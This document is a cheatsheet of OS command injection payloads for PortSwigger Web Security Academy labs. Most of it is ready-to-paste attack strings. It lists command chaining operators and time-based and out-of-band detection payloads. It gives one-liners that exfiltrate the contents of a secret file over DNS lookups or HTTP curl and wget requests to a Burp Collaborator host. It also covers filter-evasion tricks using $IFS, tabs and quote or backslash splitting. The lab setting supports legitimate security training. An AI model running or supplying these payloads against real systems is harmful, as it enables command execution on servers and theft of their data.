# 💻 OS Command Injection Cheatsheet

Complete command chaining operators, out-of-band (OAST) exfiltration techniques, filter bypasses, and time-based detection payloads for Command Injection labs in PortSwigger Web Security Academy.

> **⚠️ Note:** Always replace `burp.oastify.com` with your active Burp Collaborator domain.

---

## 📌 1. Command Separators & Operators

Use command operators to chain execution when injecting into vulnerable system arguments.

* **Semicolon (Unix):** `;`
* **Pipe:** `|`
* **Logical OR:** `||`
* **Background Execution:** `&`
* **Logical AND:** `&&`
* **Newline (URL Encoded):** `%0a`
* **Carriage Return:** `%0d`
* **Inline Execution / Backticks:** `` `command` ``
* **Command Substitution:** `$(command)`

---

## 📌 2. Detection Payloads

### Time-Based Blind Detection
Induces execution delays on the host to confirm command injection when output is not reflected.

* **Linux Sleep:**
  <pre><code>||sleep 10||</code></pre>

* **Ping Delays (10 packets ~ 10 sec):**
  <pre><code>||ping -c 10 127.0.0.1||</code></pre>

### Out-of-Band (OAST) Blind Detection
Triggers DNS or HTTP lookups to verify command execution via Burp Collaborator.

<pre><code>||nslookup burp.oastify.com||
||curl burp.oastify.com||</code></pre>

---

## 📌 3. Data Exfiltration Techniques

### DNS Exfiltration (Recommended)
Exfiltrates data inside subdomain queries. Best for restrictive environments where outbound HTTP is blocked.

* **Subshell Execution:**
  <pre><code>||nslookup $(cat /home/carlos/secret).burp.oastify.com||</code></pre>

* **Backtick Execution:**
  <pre><code>||nslookup `cat /home/carlos/secret`.burp.oastify.com||</code></pre>

* **Alternative Operators:**
<pre><code>;nslookup $(cat /home/carlos/secret).burp.oastify.com;
|nslookup $(cat /home/carlos/secret).burp.oastify.com|
&nslookup $(cat /home/carlos/secret).burp.oastify.com&</code></pre>

### HTTP Exfiltration

* **Via `curl` (Query Parameter):**
  <pre><code>||curl burp.oastify.com?c=$(cat /home/carlos/secret)||</code></pre>

* **Via `curl` (POST Body):**
  <pre><code>||curl burp.oastify.com --data "$(cat /home/carlos/secret)"||</code></pre>

* **Via `wget` (POST Request):**
  <pre><code>||wget --post-data=$(cat /home/carlos/secret) burp.oastify.com||</code></pre>

---

## 📌 4. Bypass Techniques

### Space Character Filtering
Bypasses input filters that strip or reject spaces.

* **Using Environment Variables (`$IFS`):**
<pre><code>cat${IFS}/home/carlos/secret
cat$IFS$9/home/carlos/secret</code></pre>

* **Using Tab Character (`%09`):**
<pre><code>cat%09/home/carlos/secret</code></pre>

### Keyword & Blacklist Filtering
Bypasses filters blocking specific commands like `cat`, `whoami`, or file paths.

* **Concatenation with Single Quotes:**
<pre><code>c''at /home/carlos/secret</code></pre>

* **Concatenation with Backslashes:**
<pre><code>c\at /home/carlos/secret</code></pre>

---
